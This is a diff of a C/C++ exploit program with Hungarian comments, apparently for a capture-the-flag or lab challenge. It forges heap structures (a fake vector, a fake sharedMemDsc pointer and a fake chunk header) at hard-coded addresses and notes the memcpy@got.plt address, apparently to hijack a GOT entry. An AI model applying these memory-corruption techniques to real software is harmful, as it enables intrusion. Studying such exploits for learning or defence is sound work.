@@ -20,6 +20,12 @@ int main(int argc, char* argv[]) {
     auto addr_first_chunk = 0x7fffffffd920; // gdb
     addr_first_chunk = 0x7fffffffd9c0;  // me input
     addr_first_chunk = 0x7fffffffd950;  // make send-local
+    /*ha az aslr be van kapcsolva akkor a send-local lehet ilyen:
+        buffer eleje         <memcpy@got.plt>:
+        0x7ffeb7423e60
+        0x7ffc811b7cd0      0x409070
+    */
+
     if(argc>1) {
         addr_first_chunk = strtol(argv[1], NULL, 16);
         
@@ -30,10 +36,11 @@ int main(int argc, char* argv[]) {
    
     paddr[(0xf * chunkSize) / 8 + 2] = addr_first_chunk - 0x100;
 
-    paddr[5] = addr_first_chunk + 6*8;
-    paddr[6] = addr_first_chunk + 8*8;
-    paddr[7] = addr_first_chunk + 8*8 + 3*8;
+    paddr[5] = addr_first_chunk + 6*8;  // ez a vektor elso qwordje, ez mutat a vector<sharedMemdsc*> elso elemere
+    paddr[6] = addr_first_chunk + 8*8;  // ez a vektor elso eleme, ez egy sharedMemDsc*
+    paddr[7] = 0; // addr_first_chunk + 8*8 + 3*8;
    
+    // ez a sharedMemDsc
     paddr[8] = 0x11;
 
     //     Dump of assembler code for function memcpy@plt:
